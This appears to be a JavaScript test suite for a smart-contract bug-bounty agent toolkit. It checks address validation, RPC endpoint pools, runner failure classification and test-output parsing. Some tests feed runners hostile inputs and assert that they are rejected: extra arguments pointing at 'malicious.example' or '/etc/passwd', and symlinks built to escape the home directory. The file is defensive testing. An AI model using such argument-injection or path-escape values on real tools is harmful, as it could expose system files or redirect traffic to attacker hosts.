    assert.equal(cwFinding.sc_evidence.contract_address, osmoAddr); // already lowercase
    assert.equal(cwFinding.sc_evidence.fork_block, 14_500_000);
  });
});

test("sc_evidence rejects chain_family='substrate' with unknown network", () => {
  const { normalizeFindingRecord } = require("../mcp/lib/findings.js");
  assert.throws(() => normalizeFindingRecord({
    id: "F-1",
    target_domain: "example.com",
    title: "x",
    severity: "low",
    cwe: null,
    endpoint: "x",
    description: "x",
    proof_of_concept: "y",
    response_evidence: null,
    impact: null,
    validated: true,
    wave: null,
    agent: null,
    surface_id: null,
    surface_type: "smart_contract",
    sc_evidence: {
      chain_family: "substrate",
      chain_id: "ethereum",
      contract_address: "5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY",
      harness_path: os.homedir(),
      match_test: "test_x",
    },
  }), /chain_id must be one of: polkadot, kusama, astar, shiden, rococo, westend, localnet/);
});

test("sc_evidence rejects chain_family='cosmwasm' with unknown network", () => {
  const { normalizeFindingRecord } = require("../mcp/lib/findings.js");
  assert.throws(() => normalizeFindingRecord({
    id: "F-1",
    target_domain: "example.com",
    title: "x",
    severity: "low",
    cwe: null,
    endpoint: "x",
    description: "x",
    proof_of_concept: "y",
    response_evidence: null,
    impact: null,
    validated: true,
    wave: null,
    agent: null,
    surface_id: null,
    surface_type: "smart_contract",
    sc_evidence: {
      chain_family: "cosmwasm",
      chain_id: "kusama",
      contract_address: "osmo1qypqxpq9qcrsszg2pvxq6rs0zqg3yyc5z5tpwxqergd3c8g7rusq4z5ese",
      harness_path: os.homedir(),
      match_test: "test_x",
    },
  }), /chain_id must be one of: osmosis, juno, neutron, archway, sei, stargaze, terra, kava, localnet/);
});

test("sc_evidence rejects chain_family='substrate' with EVM 0x... address (alphabet violation)", () => {
  const { normalizeFindingRecord } = require("../mcp/lib/findings.js");
  // SS58 alphabet excludes 0/O/I/l, so an EVM address fails the base58 check.
  assert.throws(() => normalizeFindingRecord({
    id: "F-1",
    target_domain: "example.com",
    title: "x",
    severity: "low",
    cwe: null,
    endpoint: "x",
    description: "x",
    proof_of_concept: "y",
    response_evidence: null,
    impact: null,
    validated: true,
    wave: null,
    agent: null,
    surface_id: null,
    surface_type: "smart_contract",
    sc_evidence: {
      chain_family: "substrate",
      chain_id: "polkadot",
      contract_address: "0x" + "ab".repeat(20),
      harness_path: os.homedir(),
      match_test: "test_x",
    },
  }), /contract_address must be a valid SS58-encoded substrate address/);
});

test("sc_evidence rejects chain_family='substrate' with too-short SS58", () => {
  const { normalizeFindingRecord } = require("../mcp/lib/findings.js");
  // 30 chars is below the 45-char SS58 length floor.
  assert.throws(() => normalizeFindingRecord({
    id: "F-1",
    target_domain: "example.com",
    title: "x",
    severity: "low",
    cwe: null,
    endpoint: "x",
    description: "x",
    proof_of_concept: "y",
    response_evidence: null,
    impact: null,
    validated: true,
    wave: null,
    agent: null,
    surface_id: null,
    surface_type: "smart_contract",
    sc_evidence: {
      chain_family: "substrate",
      chain_id: "polkadot",
      contract_address: "5Grwvaef5zxb26fz9rcqpdws57",
      harness_path: os.homedir(),
      match_test: "test_x",
    },
  }), /contract_address must be a valid SS58-encoded substrate address/);
});

test("sc_evidence rejects chain_family='cosmwasm' with bad bech32 checksum", () => {
  const { normalizeFindingRecord } = require("../mcp/lib/findings.js");
  // Last 6 chars of valid bech32 mutated to break the polymod checksum.
  assert.throws(() => normalizeFindingRecord({
    id: "F-1",
    target_domain: "example.com",
    title: "x",
    severity: "low",
    cwe: null,
    endpoint: "x",
    description: "x",
    proof_of_concept: "y",
    response_evidence: null,
    impact: null,
    validated: true,
    wave: null,
    agent: null,
    surface_id: null,
    surface_type: "smart_contract",
    sc_evidence: {
      chain_family: "cosmwasm",
      chain_id: "osmosis",
      contract_address: "osmo1qypqxpq9qcrsszg2pvxq6rs0zqg3yyc5z5tpwxqergd3c8g7rusqaaaaaa",
      harness_path: os.homedir(),
      match_test: "test_x",
    },
  }), /contract_address must be a valid bech32-encoded CosmWasm address/);
});

test("sc_evidence rejects chain_family='cosmwasm' with EVM 0x... address (no bech32 separator)", () => {
  const { normalizeFindingRecord } = require("../mcp/lib/findings.js");
  assert.throws(() => normalizeFindingRecord({
    id: "F-1",
    target_domain: "example.com",
    title: "x",
    severity: "low",
    cwe: null,
    endpoint: "x",
    description: "x",
    proof_of_concept: "y",
    response_evidence: null,
    impact: null,
    validated: true,
    wave: null,
    agent: null,
    surface_id: null,
    surface_type: "smart_contract",
    sc_evidence: {
      chain_family: "cosmwasm",
      chain_id: "osmosis",
      contract_address: "0x" + "ab".repeat(20),
      harness_path: os.homedir(),
      match_test: "test_x",
    },
  }), /contract_address must be a valid bech32-encoded CosmWasm address/);
});

test("sc_evidence rejects chain_family='cosmwasm' with mixed-case bech32 (spec violation)", () => {
  const { normalizeFindingRecord } = require("../mcp/lib/findings.js");
  // BIP-0173 explicitly forbids mixed-case in bech32; either fully lowercase
  // or fully uppercase is allowed, but never both. We mirror that rule.
  assert.throws(() => normalizeFindingRecord({
    id: "F-1",
    target_domain: "example.com",
    title: "x",
    severity: "low",
    cwe: null,
    endpoint: "x",
    description: "x",
    proof_of_concept: "y",
    response_evidence: null,
    impact: null,
    validated: true,
    wave: null,
    agent: null,
    surface_id: null,
    surface_type: "smart_contract",
    sc_evidence: {
      chain_family: "cosmwasm",
      chain_id: "osmosis",
      contract_address: "Osmo1qypqxpq9qcrsszg2pvxq6rs0zqg3yyc5z5tpwxqergd3c8g7rusq4z5ese",
      harness_path: os.homedir(),
      match_test: "test_x",
    },
  }), /contract_address must be a valid bech32-encoded CosmWasm address/);
});

test("sc_evidence svm pubkey accepts the 32-char System Program (all-zero pubkey)", () => {
  const { normalizeFindingRecord } = require("../mcp/lib/findings.js");
  // 11111111111111111111111111111111 — 32 chars, base58-decodes to 32 zero
  // bytes. The System Program is a legitimate Solana pubkey at 32 chars.
  // The new decode-length check must not regress on this fixture.
  const finding = normalizeFindingRecord({
    id: "F-1",
    target_domain: "example.com",
    title: "x",
    severity: "low",
    cwe: null,
    endpoint: "x",
    description: "x",
    proof_of_concept: "y",
    response_evidence: null,
    impact: null,
    validated: true,
    wave: null,
    agent: null,
    surface_id: null,
    surface_type: "smart_contract",
    sc_evidence: {
      chain_family: "svm",
      chain_id: "mainnet-beta",
      contract_address: "11111111111111111111111111111111",
      harness_path: os.homedir(),
      match_test: "test_x",
    },
  });
  assert.equal(finding.sc_evidence.contract_address, "11111111111111111111111111111111");
});

test("anchor runner classifies cargo/solana/yarn missing as anchor_dependency_missing", () => {
  const { classifyAnchorFailure } = require("../mcp/lib/anchor-runner.js");
  const cargoMissing = classifyAnchorFailure(
    { ok: false, exit_code: 127, stderr: "/bin/sh: cargo: command not found", stdout: "" },
    false,
  );
  assert.equal(cargoMissing, "anchor_dependency_missing");

  const solanaMissing = classifyAnchorFailure(
    { ok: false, exit_code: 127, stderr: "anchor: solana command not found in PATH", stdout: "" },
    false,
  );
  assert.equal(solanaMissing, "anchor_dependency_missing");

  const validatorMissing = classifyAnchorFailure(
    { ok: false, exit_code: 127, stderr: "Error: solana-test-validator: No such file or directory", stdout: "" },
    false,
  );
  assert.equal(validatorMissing, "anchor_dependency_missing");

  const yarnMissing = classifyAnchorFailure(
    { ok: false, exit_code: 127, stderr: "/bin/sh: yarn: command not found", stdout: "" },
    false,
  );
  assert.equal(yarnMissing, "anchor_dependency_missing");

  // No deps mentioned, just a generic shell error → unclassified (returns null)
  const generic = classifyAnchorFailure(
    { ok: false, exit_code: 1, stderr: "Error: build failed", stdout: "" },
    false,
  );
  assert.equal(generic, null);

  // ok=true → no classification needed
  const success = classifyAnchorFailure({ ok: true, stderr: "", stdout: "{...}" }, true);
  assert.equal(success, null);
});

test("anchor runner classifies jest/ts-mocha config as anchor_test_runner_unknown", () => {
  const { classifyAnchorFailure } = require("../mcp/lib/anchor-runner.js");
  const jestRunner = classifyAnchorFailure(
    { ok: false, exit_code: 1, stderr: "Running test command: jest --testPathPattern=...", stdout: "" },
    false, // parseResult.ok = false (no mocha JSON)
  );
  assert.equal(jestRunner, "anchor_test_runner_unknown");

  const tsMocha = classifyAnchorFailure(
    { ok: false, exit_code: 2, stderr: "ts-mocha: cannot find ts file", stdout: "" },
    false,
  );
  assert.equal(tsMocha, "anchor_test_runner_unknown");

  const customRunner = classifyAnchorFailure(
    { ok: false, exit_code: 1, stderr: "Cannot find module './reporter/json'", stdout: "" },
    false,
  );
  assert.equal(customRunner, "anchor_test_runner_unknown");

  // dependency-missing wins over runner-unknown when both patterns match
  const both = classifyAnchorFailure(
    { ok: false, exit_code: 127, stderr: "yarn: command not found\nts-mocha: missing", stdout: "" },
    false,
  );
  assert.equal(both, "anchor_dependency_missing");

  // If parseResult.ok is true (mocha JSON present), runner-unknown does not fire.
  const parsedFine = classifyAnchorFailure(
    { ok: false, exit_code: 1, stderr: "ts-mocha hint", stdout: "{stats:...}" },
    true,
  );
  assert.equal(parsedFine, null);
});

test("anchor runner summarizes mocha JSON Pass/Fail and caps tests[] at 100", () => {
  const { summarizeAnchorMochaJson } = require("../mcp/lib/anchor-runner.js");
  // Mocha JSON shape: stats + tests array. err empty = passed; err present = failed.
  const result = summarizeAnchorMochaJson({
    stats: { tests: 3, passes: 1, failures: 1, pending: 1 },
    tests: [
      { title: "drains the vault", fullTitle: "Vault drains the vault", duration: 412, err: {} },
      { title: "rejects unauthorized signer", fullTitle: "Vault rejects unauthorized signer", duration: 89, err: { message: "AssertionError: expected revert" } },
      { title: "skipped when feature flag is off", fullTitle: "Vault skipped when feature flag is off", duration: 0, err: {}, pending: true },
    ],
  });
  assert.equal(result.total, 3);
  assert.equal(result.passed, 1);
  assert.equal(result.failed, 1);
  assert.equal(result.tests[0].status, "Pass");
  assert.equal(result.tests[0].status_raw, "success");
  assert.equal(result.tests[1].status, "Fail");
  assert.equal(result.tests[1].status_raw, "failure");
  assert.equal(result.tests[1].reason, "AssertionError: expected revert");
  assert.equal(result.tests[2].status, "Skipped");
  assert.equal(result.truncated, false);

  // 150 passing tests → capped at 100, truncated flag.
  const big = { stats: { tests: 150 }, tests: [] };
  for (let i = 0; i < 150; i += 1) {
    big.tests.push({ title: `t_${i}`, fullTitle: `Suite t_${i}`, duration: 1, err: {} });
  }
  const capped = summarizeAnchorMochaJson(big);
  assert.equal(capped.total, 150);
  assert.equal(capped.passed, 150);
  assert.equal(capped.tests.length, 100, "tests[] must be capped at 100");
  assert.equal(capped.truncated, true);
});

test("anchor runner rejects extra_args not in the allowlist", async () => {
  const { runAnchorTest } = require("../mcp/lib/anchor-runner.js");
  // Use os.homedir() as the workdir (real, under-home, exists). The args
  // validator runs before subprocess spawn, so this assertion fires without
  // requiring anchor in PATH.
  await assert.rejects(async () => runAnchorTest({
    workdir: os.homedir(),
    matchTest: "test_x",
    cluster: "mainnet-beta",
    extraArgs: ["--provider.cluster", "https://malicious.example/rpc"],
    timeoutMs: 5000,
  }), /not in the anchor allowlist/);
});

test("anchor runner rejects symlink-escaping harness paths", async () => {
  const { runAnchorTest } = require("../mcp/lib/anchor-runner.js");
  const home = os.homedir();
  const tmpRoot = path.join(os.tmpdir(), "bob-anchor-symlink-" + Math.random().toString(36).slice(2));
  fs.mkdirSync(tmpRoot, { recursive: true });
  const linkPath = path.join(home, "anchor-escape-link");
  try { fs.unlinkSync(linkPath); } catch {}
  fs.symlinkSync(tmpRoot, linkPath, "dir");
  try {
    await assert.rejects(async () => runAnchorTest({
      workdir: linkPath,
      matchTest: "test_x",
      cluster: "mainnet-beta",
      timeoutMs: 5000,
    }), /must live under the user home directory/);
  } finally {
    try { fs.unlinkSync(linkPath); } catch {}
    try { fs.rmdirSync(tmpRoot); } catch {}
  }
});

test("svm rpc pool resolves cluster ladders and rejects private hosts", () => {
  const { resolveSvmRpcEndpoints, isPublicHttpsUrl } = require("../mcp/lib/svm-rpc-pool.js");
  const mainnet = resolveSvmRpcEndpoints("mainnet-beta");
  assert.ok(Array.isArray(mainnet) && mainnet.length >= 2, "mainnet-beta has multiple endpoints");
  assert.ok(mainnet.every((url) => url.startsWith("https://")), "all endpoints are https");
  const devnet = resolveSvmRpcEndpoints("devnet");
  assert.ok(devnet.length >= 1, "devnet has at least one endpoint");
  assert.equal(isPublicHttpsUrl("https://api.mainnet-beta.solana.com"), true);
  assert.equal(isPublicHttpsUrl("http://localhost:8899"), false);
  assert.equal(isPublicHttpsUrl("https://192.168.1.1:8899"), false);
});

test("svm rpc pool env override is read with the dashed-cluster key shape", () => {
  const { resolveSvmRpcEndpoints, envKeyForCluster } = require("../mcp/lib/svm-rpc-pool.js");
  // mainnet-beta should map to BOB_SVM_RPCS_MAINNET_BETA
  assert.equal(envKeyForCluster("mainnet-beta"), "BOB_SVM_RPCS_MAINNET_BETA");
  const previous = process.env.BOB_SVM_RPCS_MAINNET_BETA;
  process.env.BOB_SVM_RPCS_MAINNET_BETA = "https://override.example.com/rpc";
  try {
    const result = resolveSvmRpcEndpoints("mainnet-beta");
    assert.equal(result[0], "https://override.example.com/rpc", "env override is tried first");
  } finally {
    if (previous === undefined) delete process.env.BOB_SVM_RPCS_MAINNET_BETA;
    else process.env.BOB_SVM_RPCS_MAINNET_BETA = previous;
  }
});

test("svm-fetch-program parses BPFLoaderUpgradeable Program account discriminator", () => {
  const svmFetchProgram = require("../mcp/lib/tools/svm-fetch-program.js");
  const { parseProgramAccount, parseProgramDataAccount, base58Encode } = svmFetchProgram._internals;
  // System Program zeroed pubkey (32 bytes).
  const sysProgramBytes = Buffer.alloc(32, 0);
  const programDataPubkeyB58 = base58Encode(sysProgramBytes);
  // Program account: discriminator=2 little-endian + 32 bytes programdata addr.
  const programData = Buffer.alloc(36);
  programData.writeUInt32LE(2, 0);
  sysProgramBytes.copy(programData, 4);
  const parsed = parseProgramAccount(programData);
  assert.equal(parsed.kind, "program");
  assert.equal(parsed.programdata_address, programDataPubkeyB58);

  // ProgramData account: discriminator=3 + slot u64 + option(1) + Pubkey(32).
  // Use upgrade authority = 32 bytes of 0x11.
  const authBytes = Buffer.alloc(32, 0x11);
  const pdData = Buffer.alloc(45);
  pdData.writeUInt32LE(3, 0);
  pdData.writeBigUInt64LE(123456n, 4);
  pdData.writeUInt8(1, 12); // option Some
  authBytes.copy(pdData, 13);
  const pdParsed = parseProgramDataAccount(pdData);
  assert.equal(pdParsed.kind, "programdata");
  assert.equal(pdParsed.deployed_slot, 123456);
  assert.equal(pdParsed.upgrade_authority, base58Encode(authBytes));

  // Frozen ProgramData (option=None).
  const frozenData = Buffer.alloc(13);
  frozenData.writeUInt32LE(3, 0);
  frozenData.writeBigUInt64LE(99n, 4);
  frozenData.writeUInt8(0, 12); // option None
  const frozenParsed = parseProgramDataAccount(frozenData);
  assert.equal(frozenParsed.upgrade_authority, null);
  assert.equal(frozenParsed.deployed_slot, 99);
});

test("svm tools register with verifier role bundle (so balanced/brutalist/final can re-run SVM PoCs)", () => {
  const tools = ["bounty_svm_fetch_account", "bounty_svm_fetch_program", "bounty_anchor_run"];
  for (const name of tools) {
    const meta = TOOL_MANIFEST[name];
    assert.ok(meta, `${name} is in TOOL_MANIFEST`);
    assert.deepEqual(meta.role_bundles, ["hunter", "verifier"], `${name} exposes role_bundles=[hunter, verifier]`);
    assert.equal(meta.network_access, true, `${name} declares network_access`);
  }
});

// ----------------------------------------------------------------------
// Phase 5b: Move (Aptos + Sui) primitives
// ----------------------------------------------------------------------

test("aptos rpc pool resolves network ladders and rejects private hosts", () => {
  const { resolveAptosRpcEndpoints, isPublicHttpsUrl } = require("../mcp/lib/aptos-rpc-pool.js");
  const mainnet = resolveAptosRpcEndpoints("mainnet");
  assert.ok(Array.isArray(mainnet) && mainnet.length >= 1, "mainnet has at least one endpoint");
  assert.ok(mainnet.every((url) => url.startsWith("https://")), "all endpoints are https");
  // Aptos URLs include /v1 in the suffix because the REST API is path-anchored.
  assert.ok(mainnet.every((url) => url.endsWith("/v1")), "Aptos endpoints carry /v1 suffix");
  const testnet = resolveAptosRpcEndpoints("testnet");
  assert.ok(testnet.length >= 1, "testnet has at least one endpoint");
  assert.equal(isPublicHttpsUrl("https://api.mainnet.aptoslabs.com/v1"), true);
  assert.equal(isPublicHttpsUrl("http://localhost:8080"), false);
  assert.equal(isPublicHttpsUrl("https://192.168.1.1/v1"), false);
});

test("aptos rpc pool env override is read with BOB_APTOS_RPCS_<NETWORK>", () => {
  const { resolveAptosRpcEndpoints, envKeyForNetwork } = require("../mcp/lib/aptos-rpc-pool.js");
  assert.equal(envKeyForNetwork("mainnet"), "BOB_APTOS_RPCS_MAINNET");
  const previous = process.env.BOB_APTOS_RPCS_MAINNET;
  process.env.BOB_APTOS_RPCS_MAINNET = "https://override.example.com/v1";
  try {
    const result = resolveAptosRpcEndpoints("mainnet");
    assert.equal(result[0], "https://override.example.com/v1", "env override is tried first");
  } finally {
    if (previous === undefined) delete process.env.BOB_APTOS_RPCS_MAINNET;
    else process.env.BOB_APTOS_RPCS_MAINNET = previous;
  }
});

test("sui rpc pool resolves network ladders and rejects private hosts", () => {
  const { resolveSuiRpcEndpoints, isPublicHttpsUrl } = require("../mcp/lib/sui-rpc-pool.js");
  const mainnet = resolveSuiRpcEndpoints("mainnet");
  assert.ok(Array.isArray(mainnet) && mainnet.length >= 1, "mainnet has at least one endpoint");
  assert.ok(mainnet.every((url) => url.startsWith("https://")), "all endpoints are https");
  const testnet = resolveSuiRpcEndpoints("testnet");
  assert.ok(testnet.length >= 1, "testnet has at least one endpoint");
  // localnet has empty default — operators set BOB_SUI_RPCS_LOCALNET. The
  // resolve function should still return [] without throwing.
  const localnet = resolveSuiRpcEndpoints("localnet");
  assert.deepEqual(localnet, []);
  assert.equal(isPublicHttpsUrl("https://fullnode.mainnet.sui.io:443"), true);
  assert.equal(isPublicHttpsUrl("http://localhost:9000"), false);
});

test("sui rpc pool env override is read with BOB_SUI_RPCS_<NETWORK>", () => {
  const { resolveSuiRpcEndpoints, envKeyForNetwork } = require("../mcp/lib/sui-rpc-pool.js");
  assert.equal(envKeyForNetwork("mainnet"), "BOB_SUI_RPCS_MAINNET");
  const previous = process.env.BOB_SUI_RPCS_LOCALNET;
  process.env.BOB_SUI_RPCS_LOCALNET = "https://localnet-override.example.com:9000";
  try {
    const result = resolveSuiRpcEndpoints("localnet");
    assert.equal(result[0], "https://localnet-override.example.com:9000", "env override populates the empty localnet ladder");
  } finally {
    if (previous === undefined) delete process.env.BOB_SUI_RPCS_LOCALNET;
    else process.env.BOB_SUI_RPCS_LOCALNET = previous;
  }
});

test("parseMoveTestStdout parses Move unit test output line-by-line", () => {
  const { parseMoveTestStdout } = require("../mcp/lib/move-test-output.js");
  const stdout = [
    "Running Move unit tests",
    "[ PASS    ] 0x42::vault::test_deposit_ok",
    "[ FAIL    ] 0x42::vault::test_withdraw_unauthorized",
    "        ┌── test_withdraw_unauthorized ──────",
    "        │ error[E11001]: aborted with code 100",
    "        └────────────────────────────────────",
    "[ TIMEOUT ] 0x42::vault::test_loop",
    "Test result: FAILED. Total tests: 3; passed: 1; failed: 2",
  ].join("\n");
  const r = parseMoveTestStdout(stdout);
  assert.equal(r.ok, true);
  assert.equal(r.total, 3);
  assert.equal(r.passed, 1);
  assert.equal(r.failed, 2);
  assert.equal(r.timed_out, 1);
  assert.equal(r.tests[0].test_id, "0x42::vault::test_deposit_ok");
  assert.equal(r.tests[0].status, "Pass");
  assert.equal(r.tests[1].status, "Fail");
  assert.equal(r.tests[1].test_id, "0x42::vault::test_withdraw_unauthorized");
  // Diagnostic line follows [ FAIL ] — captured as reason.
  assert.match(r.tests[1].reason || "", /aborted with code 100|error\[E11001\]/);
  // TIMEOUT normalizes to status=Fail (so verifier sees the assertion held).
  assert.equal(r.tests[2].status, "Fail");
  assert.equal(r.tests[2].status_raw, "TIMEOUT");
});

test("parseMoveTestStdout captures inline failure reason from Sui-style '; ABORTED at code N' suffix", () => {
  const { parseMoveTestStdout } = require("../mcp/lib/move-test-output.js");
  // Sui adds the abort code/module on the same line as [ FAIL ].
  const stdout = [
    "Running Move unit tests",
    "[ PASS    ] 0x0::game::test_play",
    "[ FAIL    ] 0x0::game::test_replay; ABORTED at code 100 in module game",
    "Test result: FAILED. Total tests: 2; passed: 1; failed: 1",
  ].join("\n");
  const r = parseMoveTestStdout(stdout);
  assert.equal(r.ok, true);
  assert.equal(r.tests[1].status, "Fail");
  assert.match(r.tests[1].reason || "", /ABORTED at code 100/);
});

test("parseMoveTestStdout caps tests[] at 100 and sets truncated", () => {
  const { parseMoveTestStdout, MOVE_TESTS_CAP } = require("../mcp/lib/move-test-output.js");
  assert.equal(MOVE_TESTS_CAP, 100);
  const lines = ["Running Move unit tests"];
  for (let i = 0; i < 150; i += 1) {
    lines.push(`[ PASS    ] 0x42::big::test_${i}`);
  }
  lines.push("Test result: OK. Total tests: 150; passed: 150; failed: 0");
  const r = parseMoveTestStdout(lines.join("\n"));
  assert.equal(r.total, 150);
  assert.equal(r.tests.length, 100);
  assert.equal(r.truncated, true);
});

test("parseMoveTestStdout returns ok=false when the stdout has no test lines or result line", () => {
  const { parseMoveTestStdout } = require("../mcp/lib/move-test-output.js");
  // Compiler crash output — no [ PASS ]/[ FAIL ] and no "Test result:".
  const stdout = "error[E04001]: ...build failed\nCompilation aborted.\n";
  const r = parseMoveTestStdout(stdout);
  assert.equal(r.ok, false);
  assert.equal(r.reason, "no_test_lines");
});

test("aptos runner classifies cargo/move-cli missing as aptos_dependency_missing", () => {
  const { classifyAptosFailure } = require("../mcp/lib/aptos-runner.js");
  const cargoMissing = classifyAptosFailure(
    { ok: false, exit_code: 127, stderr: "/bin/sh: cargo: command not found", stdout: "" },
    false,
  );
  assert.equal(cargoMissing, "aptos_dependency_missing");
  const moveMissing = classifyAptosFailure(
    { ok: false, exit_code: 127, stderr: "Error: move-cli: No such file or directory", stdout: "" },
    false,
  );
  assert.equal(moveMissing, "aptos_dependency_missing");
});

test("aptos runner classifies Move compilation errors as move_compile_failed", () => {
  const { classifyAptosFailure } = require("../mcp/lib/aptos-runner.js");
  const compilerErr = classifyAptosFailure(
    { ok: false, exit_code: 1, stderr: "", stdout: "error[E04001]: name not in scope" },
    false,
  );
  assert.equal(compilerErr, "move_compile_failed");
  // Generic exit-1 with no compile signal → unclassified.
  const generic = classifyAptosFailure(
    { ok: false, exit_code: 1, stderr: "Error: misc", stdout: "" },
    false,
  );
  assert.equal(generic, null);
});

test("sui runner classifies cargo/move-cli missing as sui_dependency_missing", () => {
  const { classifySuiFailure } = require("../mcp/lib/sui-runner.js");
  const cargoMissing = classifySuiFailure(
    { ok: false, exit_code: 127, stderr: "/bin/sh: cargo: command not found", stdout: "" },
    false,
  );
  assert.equal(cargoMissing, "sui_dependency_missing");
});

test("aptos runner rejects extra_args not in the allowlist", async () => {
  const { runAptosTest } = require("../mcp/lib/aptos-runner.js");
  await assert.rejects(async () => runAptosTest({
    workdir: os.homedir(),
    matchTest: "test_x",
    network: "mainnet",
    extraArgs: ["--profile", "/etc/passwd"],
    timeoutMs: 5000,
  }), /not in the aptos allowlist/);
});

test("sui runner rejects extra_args not in the allowlist", async () => {
  const { runSuiTest } = require("../mcp/lib/sui-runner.js");
  await assert.rejects(async () => runSuiTest({
    workdir: os.homedir(),
    matchTest: "test_x",
    network: "mainnet",
    extraArgs: ["--client.config", "/etc/passwd"],
    timeoutMs: 5000,
  }), /not in the sui allowlist/);
});

test("aptos runner rejects symlink-escaping harness paths", async () => {
  const { runAptosTest } = require("../mcp/lib/aptos-runner.js");
  const home = os.homedir();
  const tmpRoot = path.join(os.tmpdir(), "bob-aptos-symlink-" + Math.random().toString(36).slice(2));
  fs.mkdirSync(tmpRoot, { recursive: true });
  const linkPath = path.join(home, "aptos-escape-link");
  try { fs.unlinkSync(linkPath); } catch {}
  fs.symlinkSync(tmpRoot, linkPath, "dir");
  try {
    await assert.rejects(async () => runAptosTest({
      workdir: linkPath,
      matchTest: "test_x",
      network: "mainnet",
      timeoutMs: 5000,
    }), /must live under the user home directory/);
  } finally {
    try { fs.unlinkSync(linkPath); } catch {}
    try { fs.rmdirSync(tmpRoot); } catch {}
  }
});

test("aptos-client normalizes Move shorthand 0x1 to canonical 64-hex form", () => {
  const { normalizeMoveAddress, isMoveAddress } = require("../mcp/lib/aptos-client.js");
  assert.equal(isMoveAddress("0x1"), true);
  assert.equal(isMoveAddress("0x"), false);
  assert.equal(isMoveAddress("11111111111111111111111111111111"), false);
  assert.equal(normalizeMoveAddress("0x1"), "0x" + "0".repeat(63) + "1");
  assert.equal(normalizeMoveAddress("0xABCD"), "0x" + "0".repeat(60) + "abcd");
});

test("sui-client normalizes Move shorthand 0x2 to canonical 64-hex form", () => {
  const { normalizeMoveAddress, isMoveAddress } = require("../mcp/lib/sui-client.js");
  assert.equal(isMoveAddress("0x2"), true);
  assert.equal(normalizeMoveAddress("0x2"), "0x" + "0".repeat(63) + "2");
});

test("hunter-brief summarizeRpcPoolForBrief dispatches to aptos and sui pool summaries", () => {
  const { summarizeRpcPoolForBrief } = require("../mcp/lib/evm-rpc-pool.js");
  const aptos = summarizeRpcPoolForBrief("aptos", "mainnet");
  assert.equal(aptos.chain_family, "aptos");
  assert.equal(aptos.network, "mainnet");
  assert.ok(Array.isArray(aptos.endpoints) && aptos.endpoints.length >= 1, "aptos mainnet pool surfaces endpoints");
  const sui = summarizeRpcPoolForBrief("sui", "mainnet");
  assert.equal(sui.chain_family, "sui");
  assert.equal(sui.network, "mainnet");
  assert.ok(Array.isArray(sui.endpoints) && sui.endpoints.length >= 1, "sui mainnet pool surfaces endpoints");
});

test("hunter-brief summarizeRpcPoolForBrief dispatches to substrate and cosmwasm pool summaries (Phase 6b)", () => {
  const { summarizeRpcPoolForBrief } = require("../mcp/lib/evm-rpc-pool.js");
  const substrate = summarizeRpcPoolForBrief("substrate", "polkadot");
  assert.equal(substrate.chain_family, "substrate");
  assert.equal(substrate.network, "polkadot");
  assert.ok(Array.isArray(substrate.endpoints) && substrate.endpoints.length >= 1, "substrate polkadot pool surfaces endpoints");
  const cosmwasm = summarizeRpcPoolForBrief("cosmwasm", "osmosis");
  assert.equal(cosmwasm.chain_family, "cosmwasm");
  assert.equal(cosmwasm.network, "osmosis");
  assert.ok(Array.isArray(cosmwasm.endpoints) && cosmwasm.endpoints.length >= 1, "cosmwasm osmosis pool surfaces endpoints");
});

test("parseCargoTestStdout parses cargo unit test output line-by-line (Phase 6b)", () => {
  const { parseCargoTestStdout } = require("../mcp/lib/cargo-test-output.js");
  const stdout = [
    "running 4 tests",
    "test tests::works ... ok",
    "test tests::fails_assert ... FAILED",
    "test slow_test ... ignored",
    "test tests::passes_too ... ok",
    "",
    "failures:",
    "",
    "---- tests::fails_assert stdout ----",
    "thread (tests::fails_assert) panicked at assertion failed: x == 5",
    "",
    "test result: FAILED. 2 passed; 1 failed; 1 ignored; 0 measured; 0 filtered out; finished in 0.05s",
  ].join("\n");
  const r = parseCargoTestStdout(stdout);
  assert.equal(r.ok, true);
  assert.equal(r.total, 4);
  assert.equal(r.passed, 2);
  assert.equal(r.failed, 1);
  assert.equal(r.ignored, 1);
  assert.equal(r.tests[0].test_id, "tests::works");
  assert.equal(r.tests[0].status, "Pass");
  assert.equal(r.tests[1].status, "Fail");
  assert.match(r.tests[1].reason || "", /panicked at assertion failed/);
  assert.equal(r.tests[2].status, "Skipped");
  assert.equal(r.tests[2].status_raw, "ignored");
});

test("parseCargoTestStdout caps tests[] at 100 and sets truncated (Phase 6b)", () => {
  const { parseCargoTestStdout, CARGO_TESTS_CAP } = require("../mcp/lib/cargo-test-output.js");
  assert.equal(CARGO_TESTS_CAP, 100);
  const lines = ["running 150 tests"];
  for (let i = 0; i < 150; i += 1) {
    lines.push(`test mod::test_${i} ... ok`);
  }
  lines.push("test result: ok. 150 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out; finished in 0.05s");
  const r = parseCargoTestStdout(lines.join("\n"));
  assert.equal(r.total, 150);
  assert.equal(r.tests.length, 100);
  assert.equal(r.truncated, true);
});

test("parseCargoTestStdout returns ok=false when stdout has no test lines or result line (Phase 6b)", () => {
  const { parseCargoTestStdout } = require("../mcp/lib/cargo-test-output.js");
  const stdout = "error[E0432]: unresolved import\nCompilation aborted.\n";
  const r = parseCargoTestStdout(stdout);
  assert.equal(r.ok, false);
  assert.equal(r.reason, "no_test_lines");
});

test("substrate runner classifies cargo missing as substrate_dependency_missing (Phase 6b)", () => {
  const { classifySubstrateFailure } = require("../mcp/lib/substrate-runner.js");
  const cargoMissing = classifySubstrateFailure(
    { ok: false, exit_code: 127, stderr: "/bin/sh: cargo: command not found", stdout: "" },
    false,
  );
  assert.equal(cargoMissing, "substrate_dependency_missing");
  // CLI usage error (older cargo rejecting --exact)
  const cliErr = classifySubstrateFailure(
    { ok: false, exit_code: 2, stderr: "error: Found argument '--exact' which wasn't expected", stdout: "" },
    false,
  );
  assert.equal(cliErr, "substrate_dependency_missing");
  // Compile error from rustc
  const compileErr = classifySubstrateFailure(
    { ok: false, exit_code: 1, stderr: "", stdout: "error[E0432]: unresolved import" },
    false,
  );
  assert.equal(compileErr, "cargo_compile_failed");
});

test("cosmwasm runner classifies cargo missing as cosmwasm_dependency_missing (Phase 6b)", () => {
  const { classifyCosmwasmFailure } = require("../mcp/lib/cosmwasm-runner.js");
  const cargoMissing = classifyCosmwasmFailure(
    { ok: false, exit_code: 127, stderr: "/bin/sh: cargo: command not found", stdout: "" },
    false,
  );
  assert.equal(cargoMissing, "cosmwasm_dependency_missing");
  const wasmdMissing = classifyCosmwasmFailure(
    { ok: false, exit_code: 127, stderr: "wasmd: command not found", stdout: "" },
    false,
  );
  assert.equal(wasmdMissing, "cosmwasm_dependency_missing");
